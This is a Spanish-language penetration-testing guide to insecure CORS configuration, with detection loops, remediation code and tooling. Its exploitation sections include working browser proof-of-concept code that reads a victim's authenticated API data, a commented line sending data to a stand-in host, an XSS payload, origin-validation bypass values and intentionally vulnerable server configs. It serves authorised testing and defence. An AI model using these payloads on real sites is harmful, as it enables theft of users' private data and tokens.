# Configuración insegura de CORS (Cross-Origin Resource Sharing)

| Clasificación | |
|---|---|
| CWE | CWE-942 — Política entre dominios permisiva con dominios no confiables. Relacionadas: CWE-346 (error de validación de origen), CWE-639 cuando expone datos de otros usuarios |
| OWASP Top 10:2025 | A02 — Security Misconfiguration (A01 — Broken Access Control si permite leer o actuar sobre datos ajenos) |
| OWASP API Top 10:2023 | API8 — Security Misconfiguration |
| WSTG | WSTG-CLNT-07 |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (origen reflejado, `null`, regex, subdominios, HTTP, comodín, preflight, red privada) · 5. Evasión de validaciones de origen · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

La **política del mismo origen** (*Same-Origin Policy*, SOP) impide que JavaScript de `https://evil.example` **lea** respuestas de `https://t.example`. **CORS** es el mecanismo con el que un servidor relaja esa regla mediante cabeceras de respuesta:

- `Access-Control-Allow-Origin` (ACAO): qué origen puede leer la respuesta (`*` o un origen concreto).
- `Access-Control-Allow-Credentials: true` (ACAC): permite que la petición lleve cookies/credenciales y que el script lea la respuesta.
- `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers`: qué métodos y cabeceras se permiten tras el *preflight* (petición `OPTIONS` previa que el navegador envía antes de peticiones «no simples»).
- `Access-Control-Expose-Headers`: qué cabeceras de respuesta puede leer el script.

La vulnerabilidad aparece cuando el servidor construye ACAO **a partir de la cabecera `Origin` de la petición** sin validarla bien (reflejo directo, regex defectuosa, confianza en `null` o en cualquier subdominio) **y** además envía `ACAC: true`. Entonces una página del atacante puede leer, con la sesión de la víctima, cualquier dato de la API (perfil, claves API, tokens CSRF) y en algunos casos ejecutar acciones con cabeceras personalizadas.

Recordatorio clave: CORS **no** protege contra el envío de peticiones (eso es CSRF); controla la **lectura** de la respuesta y el permiso para peticiones no simples.

## 2. Dónde buscar (señales del reconocimiento)

- Respuestas con `Access-Control-Allow-Origin` distinto de `*`, sobre todo si coincide con el `Origin` enviado.
- `Vary: Origin` presente (indica ACAO dinámico) o ausente con ACAO dinámico (riesgo de envenenamiento de caché, ver `vulns/cache-poisoning-deception.md`).
- APIs que sirven datos sensibles autenticadas **por cookie** (`/api/me`, `/api/keys`, `/account`, `/graphql`).
- Subdominios de la organización con contenido de usuario, XSS conocido o servidos por HTTP.
- Aplicaciones SPA en un dominio que consumen la API en otro (`app.example.com` → `api.example.com`): la lista blanca suele ser amplia.
- Servicios internos (intranet, paneles de dispositivos) con `ACAO: *`.

## 3. Detección segura (primeras sondas, no destructivas)

Usar peticiones GET de lectura sobre la cuenta de prueba. Para cada endpoint sensible, repetir con distintas cabeceras `Origin` y anotar ACAO/ACAC:

```bash
for o in https://evil.example null https://t.example.evil.example https://evilt.example \
         https://sub.t.example http://t.example https://t.example_.evil.example "https://t.example%60.evil.example"; do
  echo "== $o"; curl -s -o /dev/null -D - -H "Origin: $o" -H "Cookie: session=<sesion-prueba>" \
    https://t.example/api/me | grep -iE '^access-control|^vary'
done
```

Interpretación:

| Respuesta | Significado |
|---|---|
| `ACAO: https://evil.example` + `ACAC: true` | Reflejo arbitrario con credenciales: **vulnerable** |
| `ACAO: null` + `ACAC: true` | Confianza en `null`: **vulnerable** (iframe con sandbox) |
| `ACAO` refleja variantes del dominio | Regex o comparación de cadenas defectuosa |
| `ACAO: *` sin ACAC | Solo grave si el contenido es sensible sin credenciales (intranet, control por IP) |
| `ACAO: *` + `ACAC: true` | Los navegadores lo rechazan: no explotable en navegador (sí indica mala configuración) |
| Sin ACAO | El navegador bloquea la lectura |

Probar también el *preflight*: `curl -s -X OPTIONS -D - -H "Origin: https://evil.example" -H "Access-Control-Request-Method: PUT" -H "Access-Control-Request-Headers: x-csrf-token,content-type" https://t.example/api/me`.

## 4. Explotación por contexto o tecnología

### 4.1 Origen reflejado + credenciales (PoC de lectura)

Alojar en un dominio del auditor y abrir con la sesión de la víctima de prueba:

```html
<!doctype html><html><body><pre id=o>cargando…</pre>
<script>
fetch('https://t.example/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => {
    document.getElementById('o').textContent = t.slice(0, 500);   // mostrar en pantalla, no exfiltrar
    // Para demostrar exfiltración, enviar solo un dato no sensible de la cuenta de prueba:
    // fetch('https://oast.example/log?u=' + encodeURIComponent(JSON.parse(t).username));
  });
</script></body></html>
```

Versión con `XMLHttpRequest` (navegadores antiguos o para mostrar cabeceras):

```javascript
var x = new XMLHttpRequest();
x.open('GET', 'https://t.example/api/keys', true);
x.withCredentials = true;
x.onload = () => console.log(x.status, x.responseText.slice(0, 300));
x.send();
```

### 4.2 Origen `null` de confianza

El navegador envía `Origin: null` desde iframes con `sandbox` (sin `allow-same-origin`), documentos `data:`, redirecciones entre orígenes y ficheros locales.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
fetch('https://t.example/api/me',{credentials:'include'})
  .then(r=>r.text()).then(t=>{ document.body.textContent = t.slice(0,300); });
</script>"></iframe>
```

### 4.3 Validaciones defectuosas de origen

| Implementación defectuosa | Origen que la supera |
|---|---|
| `origin.endsWith('t.example')` | `https://evilt.example`, `https://evil-t.example` |
| `origin.startsWith('https://t.example')` | `https://t.example.evil.example` |
| `origin.includes('t.example')` | `https://t.example.evil.example`, `https://evil.example/?t.example` (si se valida la URL completa) |
| Regex `^https://app.example.com$` (punto sin escapar) | `https://appxexample.com` (dominio registrable por el atacante) |
| Regex `^https://.*example\.com$` | `https://evilexample.com` |
| Regex `https?://(.*\.)?t\.example` sin anclar `$` | `https://t.example.evil.example` |
| Lista blanca que incluye `http://` | Atacante en la misma red (MITM) inyecta script en `http://t.example` |
| Confianza en cualquier subdominio | XSS o *takeover* en `algo.t.example` (ver `vulns/xss.md`) |

Caracteres especiales en el host (algunos navegadores, sobre todo Safari, aceptan caracteres que el servidor trata como fin de dominio):

```text
Origin: https://t.example_.evil.example
Origin: https://t.example}.evil.example
Origin: https://t.example`.evil.example
```

Si el servidor acepta uno de estos y el atacante controla el comodín DNS `*.evil.example`, la página puede servirse desde ese host en el navegador que lo admita.

### 4.4 Subdominio de confianza como trampolín

Con XSS en `blog.t.example` (de confianza para la API), la carga se ejecuta en ese origen y lee la API:

```text
https://blog.t.example/search?q=<script>fetch('https://api.t.example/me',{credentials:'include'}).then(r=>r.text()).then(t=>console.log(t))</script>
```

### 4.5 Acciones con cabeceras personalizadas

Si el preflight permite al origen del atacante `PUT`/`DELETE` o cabeceras como `X-CSRF-Token`, el atacante puede **leer** el token CSRF de una respuesta y **ejecutar** acciones. ⚠️ Cualquier acción de escritura **requiere confirmación explícita del cliente** y solo contra la cuenta de prueba.

```javascript
fetch('https://t.example/api/csrf', {credentials:'include'}).then(r=>r.json()).then(j =>
  fetch('https://t.example/api/profile', {method:'PUT', credentials:'include',
    headers:{'Content-Type':'application/json','X-CSRF-Token': j.token},
    body: JSON.stringify({bio:'cors-poc'})}));
```

### 4.6 Comodín sin credenciales y redes internas

`ACAO: *` en un servicio interno (por IP o VPN) permite que una web externa visitada por un empleado lea ese servicio desde su navegador. Los navegadores Chromium aplican progresivamente **Private Network Access** (peticiones desde sitios públicos hacia IP privadas con preflight `Access-Control-Request-Private-Network`); comprobar el estado actual en el navegador objetivo antes de afirmar explotabilidad. Combinar con *DNS rebinding* solo si está en alcance.

### 4.7 Envenenamiento de caché por falta de `Vary: Origin`

Si ACAO se refleja pero la respuesta se cachea sin `Vary: Origin`, una petición del atacante puede dejar en caché una respuesta con `ACAO: https://evil.example` que reciben otros usuarios. Ver `vulns/cache-poisoning-deception.md`.

## 5. Evasión de filtros y validaciones de origen

- Mayúsculas/minúsculas: `https://T.EXAMPLE.evil.example` (el navegador normaliza el host a minúsculas, el servidor quizá no).
- Puertos: `https://t.example:443.evil.example` no es válido; probar `https://t.example:8443` si la lista blanca ignora el puerto.
- Esquemas: `http://`, y orígenes de aplicaciones híbridas (`capacitor://localhost`, `app://`, `file://` → `null`).
- Dominios registrables parecidos: `t-example.com`, `texample.com`, TLD distintos (`t.example.co`).
- Unicode/IDN: `t.exаmple` con «а» cirílica → punycode distinto; útil solo si el servidor compara tras normalizar mal.
- `Origin` duplicado o vacío: algunas implementaciones toman el primero/último (ver `vulns/parameter-pollution.md`).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- Leer datos personales de la víctima de prueba (perfil, direcciones, historial) → confidencialidad alta si es representativo de todos los usuarios.
- Leer **secretos** (claves API, tokens de recuperación, tokens CSRF) → escalar a integridad: con el token CSRF se pueden ejecutar acciones (ver `vulns/csrf.md`). Mostrar solo los primeros caracteres de cualquier secreto en el informe.
- Leer respuestas de GraphQL completas (`{me{...}}`) o de endpoints de administración si la víctima es un administrador de prueba.
- Encadenar con XSS en subdominio de confianza para saltar validaciones estrictas por dominio.
- No recopilar datos de usuarios reales: la PoC debe ejecutarse solo con la cuenta de prueba.

## 7. Caja blanca: fuentes, sumideros y patrones de código

```javascript
// Express — vulnerable: refleja cualquier origen con credenciales
app.use(cors({ origin: true, credentials: true }));
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', req.headers.origin);
  res.set('Access-Control-Allow-Credentials', 'true'); next();
});
// Vulnerable: regex sin anclar ni escapar
app.use(cors({ origin: /t.example/, credentials: true }));
// Seguro
const ALLOWED = new Set(['https://app.t.example', 'https://admin.t.example']);
app.use(cors({ origin: (o, cb) => cb(null, ALLOWED.has(o) ? o : false), credentials: true }));
```

```python
# Flask-CORS — vulnerable
CORS(app, supports_credentials=True)                    # origins por defecto '*': según versión, refleja el Origin recibido
CORS(app, origins=r".*t\.example.*", supports_credentials=True)
# Seguro
CORS(app, origins=["https://app.t.example"], supports_credentials=True)
# django-cors-headers — vulnerable
CORS_ALLOW_ALL_ORIGINS = True; CORS_ALLOW_CREDENTIALS = True
CORS_ALLOWED_ORIGIN_REGEXES = [r"^https://.*t.example$"]
```

```java
// Spring — vulnerable
config.addAllowedOriginPattern("*"); config.setAllowCredentials(true);
@CrossOrigin(origins = "*", allowCredentials = "true")   // Spring moderno lo rechaza con "*"; revisar allowedOriginPatterns
// Seguro
config.setAllowedOrigins(List.of("https://app.t.example")); config.setAllowCredentials(true);
```

```nginx
# Nginx — vulnerable: refleja $http_origin
add_header Access-Control-Allow-Origin $http_origin always;
add_header Access-Control-Allow-Credentials true always;
```

```csharp
// ASP.NET Core — vulnerable
policy.SetIsOriginAllowed(_ => true).AllowCredentials();
```

```bash
rg -n 'Access-Control-Allow-Origin|Access-Control-Allow-Credentials|allowCredentials|supports_credentials|CORS_ALLOW_ALL_ORIGINS|CORS_ORIGIN_ALLOW_ALL|CORS_ALLOWED_ORIGIN_REGEXES|SetIsOriginAllowed|addAllowedOriginPattern|allowedOriginPatterns|origin:\s*true|\$http_origin|@CrossOrigin'
rg -n 'req\.headers\.origin|request\.headers\.get\(.Origin|getHeader\("Origin"\)|HTTP_ORIGIN'
```

```bash
semgrep --config p/express --config p/flask --config p/django --config p/java .   # incluyen reglas de CORS; revisar a mano la lógica de validación
```

## 8. Falsos positivos frecuentes

- `ACAO: *` en recursos públicos (CDN, fuentes, API pública sin autenticación): correcto por diseño.
- Origen reflejado **sin** `ACAC: true` en una API autenticada por cookie: el navegador no envía cookies con `credentials:'include'` aceptadas, así que solo se leería contenido anónimo.
- API autenticada solo con `Authorization: Bearer` que el atacante no conoce: el reflejo con credenciales no da acceso a nada (las cookies no autentican).
- Reflejo solo en el preflight `OPTIONS`, pero la respuesta real no lleva ACAO.
- Cookies `SameSite=Lax/Strict`: un `fetch` cross-site no las envía aunque CORS lo permita; solo explotable desde un site hermano (subdominio) o si las cookies son `SameSite=None`.
- Endpoints que devuelven datos no sensibles (configuración pública, versión).

## 9. Evidencia mínima para validarlo

- Petición con `Origin` del atacante y respuesta con `ACAO` reflejado + `ACAC: true` (cabeceras completas).
- Atributos de la cookie de sesión (SameSite) que muestren que se envía cross-site.
- PoC HTML ejecutada desde un dominio del auditor en navegador real, con captura mostrando los datos de la **cuenta de prueba** leídos.
- Lista de endpoints sensibles afectados (no basta con un endpoint trivial).

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario | CVSS 3.1 | CVSS 4.0 (calcular con la calculadora de FIRST) |
|---|---|---|
| Lectura de datos personales de la víctima | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` = 6.5 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Lectura de secretos + acciones (token CSRF, claves API) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` = 8.1 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Requiere XSS en subdominio o Safari con caracteres especiales | Añadir `AC:H` | `AT:P` |
| Datos poco sensibles | `C:L` → 4.3 | `VC:L` |
| `ACAO: *` sin credenciales en recurso público | Informativo | — |

## 11. Remediación (con ejemplo de código correcto)

1. Lista blanca **explícita** de orígenes completos (esquema + host + puerto), comparación exacta; nunca reflejar `Origin` sin validar.
2. No aceptar `null` ni esquemas `http://` en la lista blanca.
3. Usar `Access-Control-Allow-Credentials: true` solo cuando sea imprescindible.
4. Enviar siempre `Vary: Origin` cuando ACAO sea dinámico.
5. Limitar `Allow-Methods`/`Allow-Headers` al mínimo y `Access-Control-Max-Age` razonable.
6. Cookies de sesión `SameSite=Lax/Strict` como defensa adicional; preferir tokens en cabecera para APIs consumidas entre dominios.
7. Recursos internos: no usar `*`; exigir autenticación real y no solo pertenencia a la red.

```javascript
// Middleware propio, exacto y con Vary
const ALLOWED = new Set(['https://app.t.example']);
app.use((req, res, next) => {
  const o = req.get('Origin');
  res.vary('Origin');
  if (o && ALLOWED.has(o)) {
    res.set('Access-Control-Allow-Origin', o);
    res.set('Access-Control-Allow-Credentials', 'true');
  }
  if (req.method === 'OPTIONS') {
    res.set('Access-Control-Allow-Methods', 'GET,POST');
    res.set('Access-Control-Allow-Headers', 'Content-Type,X-CSRF-Token');
    return res.sendStatus(204);
  }
  next();
});
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Repeater / bucle `curl` (sección 3) | Variar `Origin` manualmente | Siempre, primero |
| Burp Scanner / extensión *CORS\* (Additional CORS Checks)* | Detección de reflejos y variantes | Tras confirmar un endpoint candidato |
| Corsy | `python3 corsy.py -u https://t.example/api/me` (o `-i urls.txt`) | Triaje de muchos endpoints, con autorización |
| CORScanner | `python3 cors_scan.py -u https://t.example` | Alternativa a Corsy |
| Navegador + PoC HTML en dominio propio | Validación real | Siempre antes de reportar |

## 13. Referencias

- OWASP WSTG-CLNT-07 (Testing Cross Origin Resource Sharing); OWASP HTML5 Security Cheat Sheet (CORS).
- PortSwigger Web Security Academy — CORS; investigación «Exploiting CORS misconfigurations for Bitcoins and bounties» (James Kettle).
- MDN — Cross-Origin Resource Sharing; `Access-Control-Allow-Origin`; Private Network Access (Chrome).
- PayloadsAllTheThings — *CORS Misconfiguration*.
- HackTricks — *CORS - Misconfigurations & Bypass*.
- CWE-942, CWE-346.
